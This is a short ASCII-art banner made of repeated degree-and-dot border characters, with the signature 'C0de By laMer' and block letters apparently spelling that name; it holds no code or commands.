°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°·°·°·°·°·°·°·°·°·°C0de·By·laMer°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°|__|
°·°·°·°|__|_____     _ __ ___   ___ _ ___
°·°·°·°|__|\__  \   | '_ ` _ \ / _ \  '__|
°·°·°·°|__| / __ \_ | | | | | |  __/  |
°·°·°·°|__ |(____  /|_| |_| |_|\___||_|
°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°